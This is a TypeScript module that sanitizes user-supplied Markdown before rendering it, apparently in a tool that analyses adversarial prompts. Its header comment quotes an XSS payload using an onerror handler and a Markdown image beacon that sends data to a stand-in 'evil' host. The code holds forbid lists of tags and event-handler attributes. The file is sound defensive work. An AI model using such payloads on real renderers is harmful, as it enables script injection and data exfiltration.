import DOMPurify from 'dompurify';
import { marked } from 'marked';

/**
 * Safe Markdown -> HTML rendering for any surface that displays USER-SUPPLIED
 * text (the cleaned-text editor preview, etc.).
 *
 * This app's entire purpose is ingesting adversarial content — jailbreak
 * prompts, embedded shell payloads, exfiltration beacons. Rendering that
 * content's Markdown straight into the DOM (marked passes raw inline HTML
 * through by default) is a self-XSS / render-exec vector: `<img src=x
 * onerror=...>` executes script in the app's privileged context, and a bare
 * `![](https://evil/beacon?leak=…)` fires an outbound request on render — the
 * exact `THR-MD-URL-EXFIL` pattern this tool detects in *other* people's text.
 *
 * Every render path goes through here:
 *   1. DOMPurify strips <script>, event handlers (onerror/onload/…), and
 *      javascript:/data: script URIs by default.
 *   2. An afterSanitizeAttributes hook additionally neutralizes auto-loading
 *      remote resources (image beacons) and forces links to open safely —
 *      belt-and-suspenders alongside the packaged app's img-src/connect-src CSP,
 *      and the only defense in the (CSP-less) dev/browser runtime.
 */

let hookInstalled = false;
function installHook(): void {
  if (hookInstalled) return;
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    const el = node as Element;
    // Kill auto-loading remote resources (the markdown-image exfil beacon).
    for (const attr of ['src', 'srcset', 'background', 'poster']) {
      const val = el.getAttribute?.(attr);
      if (val && /^\s*https?:/i.test(val)) el.removeAttribute(attr);
    }
    // Any surviving link must open externally and safely, never auto-navigate the app.
    if (el.tagName === 'A' && el.hasAttribute('href')) {
      el.setAttribute('rel', 'noopener noreferrer');
      el.setAttribute('target', '_blank');
    }
  });
  hookInstalled = true;
}

const PURIFY_CONFIG: DOMPurify.Config = {
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'link', 'meta', 'base'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onanimationstart', 'style', 'formaction', 'srcdoc'],
  ALLOW_DATA_ATTR: false,
};

export function renderMarkdownSafe(md: string): string {
  installHook();
  const rawHtml = marked.parse(md) as string;
  return DOMPurify.sanitize(rawHtml, PURIFY_CONFIG) as unknown as string;
}

/** Sanitize an already-built HTML fragment (used before writing HTML exports to disk). */
export function sanitizeHtmlFragment(html: string): string {
  installHook();
  return DOMPurify.sanitize(html, PURIFY_CONFIG) as unknown as string;
}
